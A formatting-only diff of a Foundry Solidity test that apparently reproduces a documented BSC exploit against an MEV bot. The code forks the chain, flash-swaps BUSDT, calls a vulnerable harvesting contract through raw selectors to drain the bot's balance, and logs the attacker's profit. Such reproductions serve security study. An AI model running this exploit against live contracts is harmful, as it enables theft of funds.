@@ -14,17 +14,13 @@ import "./interface.sol";
 // https://twitter.com/Phalcon_xyz/status/1723897569661657553
 
 contract ContractTest is Test {
-    IERC20 private constant BUSDT =
-        IERC20(0x55d398326f99059fF775485246999027B3197955);
-    Uni_Pair_V2 private constant WBNB_BUSDT =
-        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
-    address private constant victimMevBot =
-        0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7;
-    address private constant assetHarvestingContract =
-        0x19a23DdAA47396335894229E0439D3D187D89eC9;
+    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    Uni_Pair_V2 private constant WBNB_BUSDT = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+    address private constant victimMevBot = 0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7;
+    address private constant assetHarvestingContract = 0x19a23DdAA47396335894229E0439D3D187D89eC9;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 33435892);
+        vm.createSelectFork("bsc", 33_435_892);
         vm.label(address(BUSDT), "BUSDT");
         vm.label(address(WBNB_BUSDT), "WBNB_BUSDT");
         vm.label(victimMevBot, "victimMevBot");
@@ -37,12 +33,7 @@ contract ContractTest is Test {
         WBNB_BUSDT.swap(BUSDT.balanceOf(victimMevBot), 0, address(this), data);
     }
 
-    function pancakeCall(
-        address _sender,
-        uint256 _amount0,
-        uint256 _amount1,
-        bytes calldata _data
-    ) external {
+    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
         // (address _assetHarvestingContract, address _victimMevBot) = abi.decode(
         //     _data,
         //     (address, address)
@@ -67,14 +58,12 @@ contract ContractTest is Test {
         BUSDT.transfer(address(WBNB_BUSDT), repayAmount);
 
         emit log_named_decimal_uint(
-            "Attacker BUSDT balance after exploit",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Attacker BUSDT balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
     }
 
     function designateRole(uint256 time, uint256 chain) internal {
-        (bool success, ) = assetHarvestingContract.call(
+        (bool success,) = assetHarvestingContract.call(
             abi.encodeWithSelector(
                 bytes4(0xac3994ec),
                 BUSDT.balanceOf(address(this)),
@@ -91,7 +80,7 @@ contract ContractTest is Test {
     }
 
     function harvestAssets(uint256 time, uint256 chain) internal {
-        (bool success, ) = assetHarvestingContract.call(
+        (bool success,) = assetHarvestingContract.call(
             abi.encodeWithSelector(
                 bytes4(0x1270d364),
                 BUSDT.balanceOf(address(this)),
